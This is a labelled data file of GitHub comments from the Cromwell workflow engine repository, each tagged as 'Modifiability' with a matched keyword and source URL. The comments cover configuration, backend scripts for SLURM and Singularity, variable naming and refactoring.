Modifiability,"Sorry @ParkvilleData, I mean the `runtime-attributes` in your `cromwell.conf` (eg: [Cromwell containers tute](https://cromwell.readthedocs.io/en/stable/tutorials/Containers/#local-environments) | [my slurm example conf](https://gist.github.com/illusional/b70f870fa0e2f8e7a0ba0a9e71d568f5#file-cromwell-slurm-singularity-conf-L61)), so it would now look something like:. ```hocon; runtime-attributes = """"""; String? docker; String head_directory = ""/data/MGP""; String singularity_image = ""/data/MGP/sing/metaGenPipe.simg""; """"""; ```. Yep you're right, the `Local` template by default uses Docker, and for some reason overriding the `runtime-attributes` in your config breaks the `submit-docker` task (even if it doesn't get used) - though I'm struggling to find references in the docs and I don't agree it should break.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694570098:658,config,config,658,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694570098,1,['config'],['config']
Modifiability,"Sorry all. I was WAY off base about that ""scalability"" thing. It turns out, if one shutdowns one's database pool, the database doesn't allow you to open any new connections. :blush:. Perhaps someday, someone will run `ab` against cromwell and see where it really does fall over, but today wasn't that day. Based on the exceptions I saw, I mistakenly thought it was an internal pool being starved, but when I actually attached a debugger, found out it was because the pool wasn't really _there_ anymore. So I closed the #199 with more extensive refactoring. Currently, even with simpler refactoring to remove calling `DataAccess.instance.shutdown()`, there seems to be something else weird in `data_access_singleton` that I need to figure out. I'm getting repeatable test failures on `WorkflowManagerActorSpec`'s ""should Try to restart workflows when there are workflows in restartable states"". Still debugging…",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143084495:544,refactor,refactoring,544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143084495,2,['refactor'],['refactoring']
Modifiability,Sorry for premature closing. I do think this should be in default config,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4615#issuecomment-461140902:66,config,config,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4615#issuecomment-461140902,1,['config'],['config']
Modifiability,"Sorry that I missed this over the Thanksgiving break. This is awesome. Personally I would favour a `JsObject` containing `left` and `right` members. I agree that this doesn't extend well to 3,4,5-tuples, etc, but I suspect for anything above 2 we'd want some sort of generic Tuple type which could have it's own rules for objectifying. In that case I could imagine a Tuple which happened to be length 2 might objectify differently from a Pair.... And IMO that'd be fine. But I'm not the only one with an opinion, I'm sure! @kcibul, @geoffjentry?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1704#issuecomment-263436694:175,extend,extend,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1704#issuecomment-263436694,1,['extend'],['extend']
Modifiability,"Sorry, the ""Voetize"" reference was to a Blue PR where Doug asked for a variable to be renamed from `rc` to `returnCode`, so here I think the variable would be `continueOnReturnCode`. We had a little cross-team discussion of this the other day and decided `UnionTypes` were probably more trouble than they're worth here, but also that the right bias of `Either` and `\/` didn't feel completely appropriate for a type which had two equally legitimate representations. The consensus seemed to be to have a `sealed trait` ADT with two case classes implementing boolean and set of ints. Does that seem reasonable to you?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/192#issuecomment-142709575:71,variab,variable,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/192#issuecomment-142709575,2,['variab'],['variable']
Modifiability,"Sorry. I didn't realize the configuration has changed between 0.19/0.19_hotfix and 0.20. What happened is that the config flag was ignored (though it would perhaps be preferable to throw an error or at least a warning.) and the cromwell tried each localization strategy until one succeeded, as described in the documentation. In my run, the files that were hard-linked live on the same storage device.; The files that were soft-linked live on another storage device, presumably because hard-linking failed. Using the new flag `-Dbackend.providers.Local.config.filesystems.local.localization.0=soft-link` ensures that all files are soft-linked as expected.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1072#issuecomment-230920938:28,config,configuration,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1072#issuecomment-230920938,3,['config'],"['config', 'configuration']"
Modifiability,"Strangely, this non-input workflow and non-AWS configuration, lead to the same error, so seems to be something about my build, not likely the AWS Batch specific part:. [my-cromwell.conf.txt](https://github.com/broadinstitute/cromwell/files/2081156/my-cromwell.conf.txt); [myWorkflow.wdl.txt](https://github.com/broadinstitute/cromwell/files/2081161/myWorkflow.wdl.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395472255:47,config,configuration,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395472255,1,['config'],['configuration']
Modifiability,"String singularity_image = ""/data/MGP/sing/metaGenPipe.simg"". command {. # make sure there is no preexisting Docker CID file; rm -f ${docker_cid}; # run as in the original configuration without --rm flag (will remove later); docker run \; --cidfile ${docker_cid} \; -i \; ${""--user "" + docker_user} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd}:delegated \; ${docker} ${docker_script}. # get the return code (working even if the container was detached); rc=$(docker wait `cat ${docker_cid}`). # remove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.in",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4051,Config,ConfigInitializationActor,4051,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,"Suggestion: Use GATK Queue as a guideline. Those messages were reasonable. On Wed, Feb 22, 2017 at 2:17 PM, Jeff Gentry <notifications@github.com>; wrote:. > this has come up a few times in a few different issues and that multitude; > actually makes the larger point here. Internally we've been discussing how; > to handle this as an upcoming project. In particular the problem is that we; > have too many different user personas and trying to have a single form of; > log meet all of their needs is going to be useless. Log levels doesn't; > quite capture all of the variables that might be in play here as often what; > happens is that someone 99% of the time only wants to see form X but once; > in a while *really* needs to see form Y and it's useless if Y wasn't; > captured at all.; >; > We're going to be moving towards some sort of system where there are; > different sorts of logs and then everyone can be happy, or at least; > happier. That's probably at least a ""next quarter"" level of project,; > however.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281771971>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk_a13fmpLUm3gESPL3BzZfNNvuzIks5rfInSgaJpZM4LpV_C>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281774983:568,variab,variables,568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1883#issuecomment-281774983,1,['variab'],['variables']
Modifiability,"Sure. Otherwise, seems fine. On May 17, 2017 10:42, ""Jeff Gentry"" <notifications@github.com> wrote:. > Could you hold off a bit? There's an update in flight to the plugin.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-302112778>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk59bJp_C1jcwAeUotUZ-mtu2w9_3ks5r6wdqgaJpZM4Nd63a>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-302113476:164,plugin,plugin,164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2276#issuecomment-302113476,1,['plugin'],['plugin']
Modifiability,"Surprisingly, there is no way to do this directly in the docker compose. The solution was to change our sbt-docker usage to run cromwell with $CROMWELL_ARGS as an environment variable, which you can set in a docker compose. For example:. `app:; image: broadinstitute/cromwell:0.20-e56c9e8-SNAPSHOT; environment:; CROMWELL_ARGS: server; `",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1481#issuecomment-249233766:175,variab,variable,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1481#issuecomment-249233766,1,['variab'],['variable']
Modifiability,"THIs wouldn’t be us contributing to nonportability, the feature is inherently non portable",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2771#issuecomment-338328135:82,portab,portable,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2771#issuecomment-338328135,1,['portab'],['portable']
Modifiability,"TOL / pipe dream: inspired by the lovely system we have for CWL conformance testing, it would be nice to give Centaur distinct concepts for `-e` (exclude a test that is conceptually inappropriate for this configuration) and `-s` (really should work on this configuration but right now doesn't). Centaur could try to run ""shoulda"" tests with the sense of pass and fail reversed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484251925:205,config,configuration,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484251925,2,['config'],['configuration']
Modifiability,"Talked to Doug. ""SAM"" itself doesn't serve HTTPS. The proxies do. The names are set there:; - [SAM](https://github.com/broadinstitute/firecloud-develop/blob/41b78578eaadb140ccdcf86d6d44de822bf9410c/configs/sam/proxy-compose.yaml.ctmpl#L17); - [Cromwell](https://github.com/broadinstitute/cromwell-develop/blob/d37f37cc8fd472b844a0b004178a1bfc458a3796/configs/caas/docker-compose.yaml.ctmpl#L32) (actually CaaS)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2513#issuecomment-331905720:198,config,configs,198,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2513#issuecomment-331905720,2,['config'],['configs']
Modifiability,"Tell me if you need me to post the metadata ...it is very big for github. WDL is below... ```; #; # Case sample workflow for a list of pairs of case-control samples. Includes GATK CNV and ACNV. Supports both WGS and WES samples. This was tested on a3c7368 commit of gatk-protected.; #; # Notes:; #; # - the input file(input_bam_list) must contain a list of tab separated values in the following format(one or more lines must be supplied):; # tumor_entity tumor_bam tumor_bam_index normal_entity normal_bam normal_bam_index <--first input; # tumor_entity tumor_bam tumor_bam_index normal_entity normal_bam normal_bam_index <--second input; # etc...; #; # - set isWGS variable to true or false to specify whether to run a WGS or WES workflow respectively; #; # - file names will use the entity ID specified, but inside the file, the bam SM tag will typically be used.; #; # - target file (which must be in tsv format) is only used with WES workflow, WGS workflow generates its own targets (so user can pass any string as an argument); #; # - the WGS PoN must be generated with WGS samples; # ; # - THIS SCRIPT SHOULD BE CONSIDERED OF ""BETA"" QUALITY; #; # - Example invocation:; # java -jar cromwell.jar run case_gatk_acnv_workflow.wdl myParameters.json; # - See case_gatk_acnv_workflow_template.json for a template json file to modify with your own parameters (please save; # your modified version with a different filename and do not commit to gatk-protected repo).; #; # - Some call inputs might seem out of place - consult with the comments in task definitions for details; #; #############. workflow case_gatk_acnv_workflow {; # Workflow input files; File target_file; File ref_fasta; File ref_fasta_dict; File ref_fasta_fai; File common_snp_list; File input_bam_list; Array[Array[String]] bam_list_array = read_tsv(input_bam_list); File PoN; String gatk_jar. # Input parameters of the PerformSegmentation tool; Float seg_param_alpha; Int seg_param_nperm; String seg_param_pmethod; Int seg_param_min",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151:666,variab,variable,666,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1488#issuecomment-249696151,1,['variab'],['variable']
Modifiability,"Temporarily closing, I need to try to DRY out the Config vs Standard stuff before review.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2929#issuecomment-346940945:50,Config,Config,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2929#issuecomment-346940945,1,['Config'],['Config']
Modifiability,"Temporary directories are a mystery for me. While I especially don't know about temp directories and environment variables, as I know this `_JAVA_OPTIONS` value is not documented anywhere. How the heck are these executables like `java` even guessing to use `/tmp` / `/var/tmp`? Is there a bash variable, or just a well know default / convention? I ask because it's possible some of our non-java programs like `bwa` etc. may run into same thing. If there is no specification to stop other programs, it's possible we may need a broader solution to instruct JES to mount, symlink, etc. these directories onto our `/cromwell_root`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/273#issuecomment-154197007:113,variab,variables,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/273#issuecomment-154197007,2,['variab'],"['variable', 'variables']"
Modifiability,"Tex-- assuming liquibase has been successfully run in the past, this `run.sh`, combined with the latest jenkins config file, _should_ start up the server cleanly. If you could sanity check run for me, I'd appreciate it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-119441052:112,config,config,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-119441052,1,['config'],['config']
Modifiability,"Thank you Dan. I checked my config and it appears to be okay, also the correct Docker Hub username and password are being printed out in the Cloud Logs (which they probably shouldn't be, but that's a separate issue). When I log in with these credentials locally using Docker engine v27.1.1 and try to pull the image from our test WDL I get the following output, exit code 1, and the image is not pulled:. ```; % docker pull ""broadinstitute/cloud-cromwell:dev""; dev: Pulling from broadinstitute/cloud-cromwell. What's next:; View a summary of image vulnerabilities and recommendations → docker scout quickview broadinstitute/cloud-cromwell:dev; [DEPRECATION NOTICE] Docker Image Format v1 and Docker Image manifest version 2, schema 1 support is disabled by default and will be removed in an upcoming release. Suggest the author of docker.io/broadinstitute/cloud-cromwell:dev to upgrade the image to the OCI Format or Docker Image manifest v2, schema 2. More information at https://docs.docker.com/go/deprecated-image-specs/; ```. I will try to find a newer private image to test with, but from your output above I'm guessing that would work. So a few concerns here:. - ~~Batch (and my local machines) don't~~ My local machine doesn't appear to be able to pull the particular `broadinstitute/cloud-cromwell:dev`Docker image from Cromwell's CI test. This may be related to the deprecation message implying that the image uses an outdated format.; - From the last line of your output, it looks as if the Batch backend is failing to get Docker image hashes for your private image, which is something that would break Cromwell's call caching.; - The aforementioned issue with plaintext Docker u/p going to the logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981:28,config,config,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321959981,1,['config'],['config']
Modifiability,Thanks ! Based on the Cromwell changelog for 25 I think you should be good to go with the same config. This is the branch: `cromwell-1938`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288859881:95,config,config,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288859881,1,['config'],['config']
Modifiability,"Thanks @antonkulaga - this is weird, it looks like the validator is incorrectly confusing the workflow output `out` and the `task get_sample` output `out`. I'm not 100% sure why, but until we fix this if you rename the `get_sample` temporary `out` variable it seems to work, eg:; ```; Array[Array[String]] out2 = read_tsv(""output.tsv""); File reads_1 = out2[0][0]; File reads_2 = out2[0][1]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3176#issuecomment-359898327:248,variab,variable,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3176#issuecomment-359898327,1,['variab'],['variable']
Modifiability,Thanks @carbocation - based on what you're saying it sounds like those run creation requests are in fact succeeding but just taking longer than Cromwell's request timeout to respond. For whoever picks up this ticket: I believe that wiring through an option to increase [timeouts on the requests to Google](https://developers.google.com/api-client-library/java/google-api-java-client/errors) (and make the value configurable) is hopefully sufficient for fixing this error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488437019:411,config,configurable,411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914#issuecomment-488437019,1,['config'],['configurable']
Modifiability,"Thanks @cjllanwarne , . > 2019-04-24 10:49:25,556 INFO - DispatchedConfigAsyncJobExecutionActor [UUID(917dfbca)JointGenotyping.ImportGenotypeGVCFs:7640:1]: Cromwell will watch for an rc file but will *not* double-check whether this job is actually alive (unless Cromwell restarts). So I guess I have not managed to enable polling after all! Edit: I found that I mispelt the configuration line, I wonder if there was a message telling me about misspelling in the logs. I had not heard of exit-poll-timeout, I assume you mean exit-code-timeout-seconds, or is this the `unrelated to this timeout`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486025965:374,config,configuration,374,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4877#issuecomment-486025965,1,['config'],['configuration']
Modifiability,"Thanks @dirkpetersen - I thought this sounded familiar!. Does the config line suggested in the PR you found fix your problem too? If so, I think I would suggest leaving the default as it is and letting you override the glob link command in your config?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5402#issuecomment-581559909:66,config,config,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5402#issuecomment-581559909,2,['config'],['config']
Modifiability,"Thanks @geoffjentry !. Yeah, I'd realised that I needed to pass an absolute path into the workflow I'm trying to run, which works for running on our local SLURM cluster, but definitely wouldn't be portable or the ""right"" way to create the workflow. It sounds like the Directory type would be the right way to do this in future, and as you say, passing a Directory down to a task to pick the needed files out. . In the meanwhile, do you know if Cromwell's CWL implementation supports the CWL Directory type? Switching to CWL might also make sense for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4526#issuecomment-452452934:197,portab,portable,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4526#issuecomment-452452934,1,['portab'],['portable']
Modifiability,Thanks @illusional! I dont think will be an option for us. Given the variable nature of the number of genomes we are going to be dealing with we are eventually going to hit this again even if we did reduce our reliance on the read functions. It feels like it needs an option in the config to increase the timeout.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-823930311:69,variab,variable,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-823930311,2,"['config', 'variab']","['config', 'variable']"
Modifiability,"Thanks @illusional, I've come to a very similar configuration, albeit for singularity 3.X. I ended up settling on this:. ```; submit-docker = """"""; export SINGULARITY_CACHEDIR=/data/cephfs/punim0751/singularity_cache; module load Singularity/3.0.3-spartan_gcc-6.2.0; IMAGE=/data/cephfs/punim0751/${docker}; singularity build --sandbox $IMAGE docker://${docker} > /dev/null; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of runni",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:48,config,configuration,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,2,"['config', 'sandbox']","['configuration', 'sandbox']"
Modifiability,"Thanks @mcovarr and @cjllanwarne. I've retargeted at develop, but to do that I had to checkout locally, rewrite my git history and force push. For context, I created the edits by clicking the ""Edit in GitHub"" button at the top right of the docs pages, but this is auto targeting at master (which makes sense I guess, but potentially a confusing barrier for people who aren't so familiar with Git). Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5784#issuecomment-677943101:104,rewrite,rewrite,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5784#issuecomment-677943101,1,['rewrite'],['rewrite']
Modifiability,"Thanks @mcovarr, I've moved this back to draft state, as it's something I'll need to put behind a configuration option, so requires more work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-652146451:98,config,configuration,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-652146451,1,['config'],['configuration']
Modifiability,"Thanks @mcovarr, that version of the WDL does indeed work now when run locally with docker (it didn't in 24, which is why I retried using task declarations on @LeeTL1220's suggestion - doing so caused the Firecloud failure reported in [GAWB-1704](https://broadinstitute.atlassian.net/browse/GAWB-1704) to match the local docker error I reported here). Unfortunately, it still fails in Firecloud with the error I initially reported in the [Firecloud forum](http://gatkforums.broadinstitute.org/gatk/discussion/8864/how-can-a-method-configuration-locate-a-file-generated-by-wdl-method-write-lines-array-file) and what @jmthibault79 is seeing:; > write_lines creates two temp files, (a) with unlocalized file paths as described above, and (b) with correctly localized file paths; > file (a) gets localized; > file (b) does not get localized; > the script correctly looks for file (b) but can't find it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-294191000:531,config,configuration-locate-a-file-generated-by-wdl-method-write-lines-array-file,531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-294191000,1,['config'],['configuration-locate-a-file-generated-by-wdl-method-write-lines-array-file']
Modifiability,"Thanks @rhpvorderman! This does indeed sound like a useful thing to be able to control. Based on your description, it feels it should probably be more of a runtime option (ie different per-task/step) rather than a global configuration option. Would you agree?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420763709:221,config,configuration,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-420763709,1,['config'],['configuration']
Modifiability,"Thanks for pointing out the Cromwell/PAPI v2 beta support for docker image caches, I wasn't aware of this feature. . After reading the documentation at https://cromwell.readthedocs.io/en/develop/backends/Google/#docker-image-cache-support, I have a few additional questions about how this could help with the problem described in this issue. . It looks like docker image caching needs to be configured at the Cromwell server level with a manifest file indicating the location of images. Are the images listed in the manifest truly global (as indicated in their paths, ie `projects/broad-dsde-cromwell-dev/global/images/..`), so they won't incur egress to use them to create VMs in different regions? Can they be made public for use by users in other projects?. For an external user already running their own cromwell instance in a different region who wants to run our pipeline, we'd need to publish an image caching configuration stanza and manifest file along with our workflow, and the administrator of the cromwell server would need to modify their server configuration to point to our manifest file and restart the server -- is that correct? If their cromwell server was already configured with a different image cache manifest, is there a way to add a second manifest, or would they have to edit their own cache manifest to include the entries in ours?. If I'm right in my understanding (please correct me if I'm not) it seems like this solution could help, but is quite cumbersome and requires very savvy external users who are willing to take extra steps to help prevent saddling us with egress charges. It would be great if a cache manifest could be configured at the workflow level -- perhaps in the wdl or the workflow options.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738:391,config,configured,391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-887774738,5,['config'],"['configuration', 'configured']"
Modifiability,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:409,config,configuration,409,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874,1,['config'],['configuration']
Modifiability,"Thanks for the brain dump. Chatting w/ some of our devops folks, they will work with us to move to CircleCI at some point. For now the team doesn't have the expertise nor bandwidth to evaluate how to do so securely. For example, we have several Hashicorp Vault rendered-secrets in our CI builds that should stay in the CI and not get vacuumed up into a docker image. I still want to ensure your code lives on, so for now [I submitted a PR](https://github.com/broadinstitute/cromwell/pull/4038) that takes takes your work above, wraps the `docker build` in a portable script, then adds it as [a parallel regression test](https://travis-ci.org/broadinstitute/cromwell/builds/420635707) under our common CI scripts. Whenever we move over from Travis to Circle it should move with the other scripts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416272052:558,portab,portable,558,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-416272052,1,['portab'],['portable']
Modifiability,"Thanks for the explanation. ""It'll be a huge headache"" is good enough for me. Is there any danger in using glob_tasks as above in terms of backend portability?. Also, could I ask what you mean here by ""backend""? Do you mean Cromwell itself, as opposed to another WMS that might implement WDL, or do you mean it in the sense of the backend definition specified in the Cromwell conf file (ie Google Cloud vs SLURM etc)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4526#issuecomment-452408474:147,portab,portability,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4526#issuecomment-452408474,1,['portab'],['portability']
